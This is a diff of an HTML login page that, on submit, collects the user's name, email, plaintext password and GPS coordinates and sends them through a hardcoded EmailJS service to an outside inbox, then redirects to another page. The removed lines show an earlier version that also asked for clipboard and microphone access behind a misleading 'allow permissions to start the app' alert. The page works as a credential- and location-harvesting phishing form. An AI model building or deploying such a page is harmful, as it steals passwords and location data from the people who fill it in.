@@ -1,13 +1,12 @@
-<!-- test.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EmailJS Test</title>
+    <title>EmailJS Geolocation</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <style>
-        /* Simple styling for the login form */
+        /* Styling */
         body {
             font-family: Arial, sans-serif;
             display: flex;
@@ -22,14 +21,12 @@
             border-radius: 5px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
-        input {
+        input, button {
             margin: 10px 0;
             padding: 10px;
             width: 100%;
         }
         button {
-            padding: 10px;
-            width: 100%;
             background-color: #007bff;
             color: white;
             border: none;
@@ -48,24 +45,18 @@
     </form>
 
     <script>
-        // Initialize EmailJS
         (function(){
             emailjs.init("by_NZBhZ4Gimyw3iY");
         })();
 
-        // Function to send email with login details
         function sendEmail(name, email, password, latitude, longitude) {
             const templateParams = {
-                 // Change as needed
                 from_name: name,
                 email: email,
                 password: password,
                 latitude: latitude,
                 longitude: longitude
-                
             };
-
-            console.log('Sending email with the following data:', templateParams);
 
             emailjs.send('service_aq0ad4m', 'template_b1rzkgc', templateParams)
                 .then(function(response) {
@@ -75,35 +66,20 @@
                 });
         }
 
-        // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent form submission
+            event.preventDefault();
 
             const name = document.getElementById('name').value;
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Show permission request popup
-            alert("Please allow permissions to start the app.");
-
-            // Request permissions and get location
-            Promise.all([
-                navigator.permissions.query({ name: 'clipboard-read' }),
-                navigator.mediaDevices.getUserMedia({ audio: true }),
-                new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject);
-                })
-            ]).then((results) => {
-                // All permissions granted
-                const position = results[2]; // Get the geolocation result
+            navigator.geolocation.getCurrentPosition(function(position) {
                 const latitude = position.coords.latitude;
                 const longitude = position.coords.longitude;
-
-                // Send email with location data
                 sendEmail(name, email, password, latitude, longitude);
-                window.location.href = 'first.html'; // Redirect to first.html
-            }).catch(() => {
-                alert("You need to allow all permissions to proceed.");
+                window.location.href = 'first.html';
+            }, function(error) {
+                alert("Geolocation access denied or unavailable.");
             });
         });
     </script>
